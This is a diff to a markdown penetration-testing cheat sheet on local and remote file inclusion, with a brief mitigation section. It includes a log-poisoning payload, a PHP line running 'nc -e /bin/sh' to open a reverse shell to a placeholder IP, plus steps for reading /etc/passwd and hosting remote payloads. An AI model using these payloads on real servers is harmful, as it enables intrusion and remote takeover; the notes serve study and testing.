@@ -1,3 +1,4 @@
+### Local File Inclusion
 * Some sites make it possible to navigate on the servers file system. Check if you can access local files.
   * /etc/passwd
   * ...
@@ -10,6 +11,7 @@
   * Change User-Agent (which is an environment variable) to:
     ```php 
     <?php passthru("nc -e /bin/sh <IP> <port>"); ?>
+    ```
   * Forward request
   * Access local file to execute the php code
 * To use /var/log/auth.log just try to ssh to that site
@@ -18,3 +20,13 @@
   * Use Burp Decoder to encode it
   * Call php decode function: **base64_decode(_"encodedCode"_)**
   * Access local file to execute the php code
+
+### Remote File Inclusion
+* Same thing as the local file inclusion but youre going to host the php code in a server
+* PHP file must be in .txt format so it wont be executed in your server
+* Add **?** after the file path (eg. http://10.10.10.10?page=http://localhost/reverse.txt?)
+
+### Mitigation
+* [Local](https://github.com/KevinSantos/Hacking/blob/master/fileInclusionMitigation.php)
+* Remote
+  * Set **allow_url_fopen** and **allow_url_include** to **Off** in php.ini
